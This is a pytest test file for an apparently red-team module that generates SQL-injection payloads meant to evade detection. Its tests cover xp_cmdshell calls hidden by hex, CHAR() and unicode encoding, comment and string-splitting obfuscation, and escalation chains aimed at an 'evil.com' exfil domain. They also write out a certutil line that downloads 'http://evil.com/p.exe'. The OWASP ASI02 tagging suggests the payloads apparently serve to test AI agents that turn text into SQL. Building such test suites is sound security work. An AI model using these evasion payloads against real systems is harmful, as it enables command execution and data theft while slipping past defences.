# SQL Injection Evasion Tests — Multi-layer evasion verification
# Academic basis:
#   - Shaburov et al. (arXiv:2403.15514) — SQL obfuscation bypass
#   - Crothers et al. (arXiv:2306.05685) — Adaptive evasion
"""test_sql_injection_evasion - Tests for SQL injection evasion module.

Coverage:
    - Layer 1: Encoding Bypass (hex, char, unicode)
    - Layer 2: Keyword Obfuscusion (dynamic var, splitting, comments)
    - Layer 3: Gradual Escalation (phase-based chains)
    - Layer 4: Detection Evasion (LOLBin, timing, fragmentation)
"""

from __future__ import annotations

from strike.sql_injection_evasion import (
    EvasionPayload,
    SQLInjectionEvasion,
    create_sql_injection_evasion,
    encode_hex,
    generate_char_concatenation,
    generate_comment_insertion,
    generate_dynamic_variable_obfuscation,
    generate_gradual_escalation_chain,
    generate_hex_encoded_xp_cmdshell,
    generate_lolbin_evasion,
    generate_multi_step_fragmentation,
    generate_string_splitting,
    generate_timing_jitter_evasion,
    generate_unicode_escape,
)

# ══════════════════════════════════════════════════════════════════════════════
# Layer 1: Encoding Bypass Tests
# ══════════════════════════════════════════════════════════════════════════════


class TestHexEncoding:
    """Test hex encoding bypass (arXiv:2403.15514)."""

    def test_encode_hex_produces_lowercase_hex(self):
        """Hex encoding produces valid lowercase hex string."""
        result = encode_hex("ping")
        assert result == "70696e67"

    def test_encode_hex_no_0x_prefix(self):
        """Hex encoding must not include 0x prefix."""
        result = encode_hex("xp_cmdshell")
        assert not result.startswith("0x")

    def test_generate_hex_encoded_xp_cmdshell_contains_cast(self):
        """Hex-encoded xp_cmdshell uses CAST pattern."""
        sql = generate_hex_encoded_xp_cmdshell("whoami")
        assert "CAST(0x" in sql
        assert "AS VARCHAR(8000))" in sql

    def test_generate_hex_encoded_xp_cmdshell_no_literal_keyword(self):
        """Hex-encoded SQL must not contain literal 'xp_cmdshell'."""
        sql = generate_hex_encoded_xp_cmdshell("ping 192.168.1.1")
        # The keyword should NOT appear in plaintext
        assert "xp_cmdshell" not in sql

    def test_generate_hex_encoded_xp_cmdshell_contains_exec(self):
        """Hex-encoded SQL uses EXEC() pattern."""
        sql = generate_hex_encoded_xp_cmdshell("whoami")
        assert "EXEC(@cmd)" in sql

    def test_generate_hex_encoded_xp_cmdshell_has_declare(self):
        """Hex-encoded SQL has DECLARE statement."""
        sql = generate_hex_encoded_xp_cmdshell("whoami")
        assert "DECLARE @cmd VARCHAR(8000)" in sql


class TestCharConcatenation:
    """Test CHAR() concatenation evasion."""

    def test_generate_char_concatenation_produces_char_functions(self):
        """CHAR() concatenation produces valid CHAR() calls."""
        result = generate_char_concatenation("ping")
        assert "CHAR(112)" in result  # 'p'
        assert "CHAR(105)" in result  # 'i'
        assert "CHAR(110)" in result  # 'n'
        assert "CHAR(103)" in result  # 'g'

    def test_generate_char_concatenation_joined_with_plus(self):
        """CHAR() parts joined with + operator."""
        result = generate_char_concatenation("ab")
        assert "+" in result

    def test_generate_char_concatenation_hides_keyword(self):
        """CHAR() result does not contain literal keyword."""
        result = generate_char_concatenation("xp_cmdshell")
        # The literal string should not appear
        assert "xp_cmdshell" not in result


class TestUnicodeEscape:
    """Test Unicode escape evasion."""

    def test_generate_unicode_escape_produces_unicode_format(self):
        """Unicode escape produces \\uXXXX format."""
        result = generate_unicode_escape("ping")
        assert "\\u" in result
        assert "0070" in result  # 'p' = U+0070

    def test_generate_unicode_escape_wraps_in_n_prefix(self):
        """Unicode escape wrapped in N'...'."""
        result = generate_unicode_escape("test")
        assert result.startswith("N'")
        assert result.endswith("'")


# ══════════════════════════════════════════════════════════════════════════════
# Layer 2: Keyword Obfuscusion Tests
# ══════════════════════════════════════════════════════════════════════════════


class TestDynamicVariableObfuscation:
    """Test dynamic variable obfuscation."""

    def test_generate_dynamic_variable_uses_declare(self):
        """Dynamic variable uses DECLARE pattern."""
        sql = generate_dynamic_variable_obfuscation("whoami")
        assert "DECLARE @x NVARCHAR(100)" in sql

    def test_generate_dynamic_variable_uses_exec(self):
        """Dynamic variable uses EXEC @x pattern."""
        sql = generate_dynamic_variable_obfuscation("whoami")
        assert "EXEC @x" in sql

    def test_generate_dynamic_variable_default_keyword(self):
        """Default keyword is xp_cmdshell."""
        sql = generate_dynamic_variable_obfuscation("whoami")
        assert "xp_cmdshell" in sql  # In variable, not direct call


class TestStringSplitting:
    """Test string splitting evasion."""

    def test_generate_string_splitting_produces_concatenation(self):
        """String splitting uses + concatenation."""
        sql = generate_string_splitting("whoami")
        assert "+" in sql

    def test_generate_string_splitting_uses_individual_chars(self):
        """String splitting uses single-char literals."""
        sql = generate_string_splitting("whoami")
        assert "'x'" in sql or "'p'" in sql  # Parts of xp_cmdshell


class TestCommentInsertion:
    """Test comment insertion evasion."""

    def test_generate_comment_insertion_inserts_comments(self):
        """Comment insertion adds /**/ sequences."""
        sql = generate_comment_insertion("whoami")
        assert "/**/" in sql

    def test_generate_comment_insertion_uses_dynamic_variable(self):
        """Comment insertion wraps in dynamic variable."""
        sql = generate_comment_insertion("whoami")
        assert "DECLARE @" in sql


# ══════════════════════════════════════════════════════════════════════════════
# Layer 3: Gradual Escalation Tests
# ══════════════════════════════════════════════════════════════════════════════


class TestGradualEscalation:
    """Test gradual escalation chains."""

    def test_generate_gradual_escalation_returns_list(self):
        """Gradual escalation returns list of payloads."""
        payloads = generate_gradual_escalation_chain(target_phase="phase1_recon")
        assert isinstance(payloads, list)
        assert len(payloads) > 0

    def test_generate_gradual_escalation_phase1_is_low_risk(self):
        """Phase 1 contains only low-risk commands."""
        payloads = generate_gradual_escalation_chain(target_phase="phase1_recon")
        for p in payloads:
            assert p.metadata["risk_level"] == "low"

    def test_generate_gradual_escalation_phase3_is_critical(self):
        """Phase 3 contains critical-risk commands."""
        payloads = generate_gradual_escalation_chain(target_phase="phase3_execution")
        phase3 = [p for p in payloads if p.metadata.get("phase") == "phase3_execution"]
        assert len(phase3) > 0
        for p in phase3:
            assert p.metadata["risk_level"] == "critical"

    def test_generate_gradual_escalation_replaces_domain(self):
        """Gradual escalation replaces placeholder domain."""
        payloads = generate_gradual_escalation_chain(
            target_phase="phase3_execution",
            exfil_domain="evil.com",
        )
        phase3 = [p for p in payloads if p.metadata.get("phase") == "phase3_execution"]
        for p in phase3:
            assert "evil.com" in p.target_command

    def test_generate_gradual_escalation_evasion_layer_set(self):
        """All payloads have gradual_escalation evasion layer."""
        payloads = generate_gradual_escalation_chain(target_phase="phase2_network")
        for p in payloads:
            assert p.evasion_layer == "gradual_escalation"


# ══════════════════════════════════════════════════════════════════════════════
# Layer 4: Detection Evasion Tests
# ══════════════════════════════════════════════════════════════════════════════


class TestLOLBinEvasion:
    """Test LOLBin alternative evasion."""

    def test_generate_lolbin_evasion_returns_multiple_variants(self):
        """LOLBin evasion returns primary + alternatives."""
        payloads = generate_lolbin_evasion(action="download")
        assert len(payloads) >= 2  # Primary certutil + at least one alternative

    def test_generate_lolbin_evasion_includes_bitsadmin(self):
        """LOLBin evasion includes bitsadmin alternative."""
        payloads = generate_lolbin_evasion(action="download")
        techniques = [p.metadata.get("lolbin") for p in payloads]
        assert "bitsadmin" in techniques

    def test_generate_lolbin_evasion_primary_is_certutil(self):
        """Primary variant is certutil (commonly flagged)."""
        payloads = generate_lolbin_evasion(action="download")
        primary = [p for p in payloads if p.metadata.get("variant") == "primary"]
        assert len(primary) == 1
        assert primary[0].metadata["lolbin"] == "certutil"

    def test_generate_lolbin_evasion_hides_in_xp_cmdshell(self):
        """LOLBin commands hidden inside xp_cmdshell calls."""
        payloads = generate_lolbin_evasion(action="download")
        for p in payloads:
            assert "xp_cmdshell" in p.expected_sql


class TestTimingJitter:
    """Test timing jitter evasion."""

    def test_generate_timing_jitter_contains_waitfor(self):
        """Timing jitter includes WAITFOR DELAY."""
        payload = generate_timing_jitter_evasion("ping 1.1.1.1")
        assert "WAITFOR DELAY" in payload.expected_sql

    def test_generate_timing_jitter_has_delay_range(self):
        """Timing jitter has configurable delay range."""
        payload = generate_timing_jitter_evasion("ping", min_delay=2, max_delay=4)
        delay = payload.metadata["delay_seconds"]
        assert 2 <= delay <= 4


class TestMultiStepFragmentation:
    """Test multi-step fragmentation."""

    def test_generate_multi_step_fragmentation_returns_steps(self):
        """Fragmentation returns multiple steps for certutil command."""
        cmd = "certutil -urlcache -split -f http://evil.com/p.exe C:\\Windows\\Temp\\p.exe"
        payloads = generate_multi_step_fragmentation(cmd)
        assert len(payloads) >= 3  # At least 3 steps when parsed successfully

    def test_generate_multi_step_fragmentation_uses_variables(self):
        """Fragmentation uses DECLARE @url/@dest variables."""
        cmd = "certutil -urlcache -split -f http://evil.com/p.exe C:\\Windows\\Temp\\p.exe"
        payloads = generate_multi_step_fragmentation(cmd)
        has_url_var = any("@url" in p.expected_sql for p in payloads)
        has_dest_var = any("@dest" in p.expected_sql for p in payloads)
        assert has_url_var
        assert has_dest_var

    def test_generate_multi_step_fragmentation_fallback(self):
        """Fragmentation returns original command when parsing fails."""
        payloads = generate_multi_step_fragmentation("invalid_command")
        assert len(payloads) == 1
        assert payloads[0].metadata.get("fragmented") is False


# ══════════════════════════════════════════════════════════════════════════════
# Master Generator Tests
# ══════════════════════════════════════════════════════════════════════════════


class TestSQLInjectionEvasion:
    """Test master SQLInjectionEvasion class."""

    def test_create_sql_injection_evasion_factory(self):
        """Factory creates valid instance."""
        evasion = create_sql_injection_evasion(exfil_domain="test.com")
        assert isinstance(evasion, SQLInjectionEvasion)
        assert evasion.exfil_domain == "test.com"

    def test_generate_all_evasion_payloads_returns_seeds(self):
        """Generate all returns seed-format dicts."""
        evasion = create_sql_injection_evasion()
        seeds = evasion.generate_all_evasion_payloads(command="whoami")
        assert isinstance(seeds, list)
        assert len(seeds) > 0

    def test_generate_all_evasion_payloads_have_required_fields(self):
        """All seeds have required fields."""
        evasion = create_sql_injection_evasion()
        seeds = evasion.generate_all_evasion_payloads(command="whoami")
        for seed in seeds:
            assert "value" in seed
            assert "metadata" in seed
            assert "category" in seed["metadata"]
            assert seed["metadata"]["category"] == "sql_injection_evasion"

    def test_generate_all_evasion_payloads_cover_all_layers(self):
        """All 4 evasion layers are represented."""
        evasion = create_sql_injection_evasion()
        seeds = evasion.generate_all_evasion_payloads(command="whoami")
        layers = {s["metadata"]["evasion_layer"] for s in seeds}
        assert "encoding" in layers
        assert "keyword_obfuscation" in layers
        assert "gradual_escalation" in layers
        assert "detection_evasion" in layers

    def test_generate_all_evasion_payloads_have_owasp_id(self):
        """All seeds have OWASP ASI02 ID."""
        evasion = create_sql_injection_evasion()
        seeds = evasion.generate_all_evasion_payloads(command="whoami")
        for seed in seeds:
            assert seed["metadata"]["owasp_id"] == "ASI02"

    def test_generate_all_evasion_payloads_are_critical_severity(self):
        """All seeds have critical severity."""
        evasion = create_sql_injection_evasion()
        seeds = evasion.generate_all_evasion_payloads(command="whoami")
        for seed in seeds:
            assert seed["metadata"]["severity"] == "critical"


# ══════════════════════════════════════════════════════════════════════════════
# EvasionPayload DataClass Tests
# ══════════════════════════════════════════════════════════════════════════════


class TestEvasionPayload:
    """Test EvasionPayload dataclass."""

    def test_to_seed_format_returns_dict(self):
        """to_seed_format returns valid dict."""
        payload = EvasionPayload(
            natural_language="test",
            expected_sql="EXEC test",
            evasion_layer="encoding",
            technique="hex",
        )
        result = payload.to_seed_format()
        assert isinstance(result, dict)
        assert "value" in result
        assert "metadata" in result

    def test_to_seed_format_truncates_long_sql(self):
        """to_seed_format truncates expected_sql to 200 chars."""
        long_sql = "A" * 300
        payload = EvasionPayload(
            natural_language="test",
            expected_sql=long_sql,
            evasion_layer="encoding",
            technique="hex",
        )
        result = payload.to_seed_format()
        assert len(result["metadata"]["expected_sql"]) <= 200
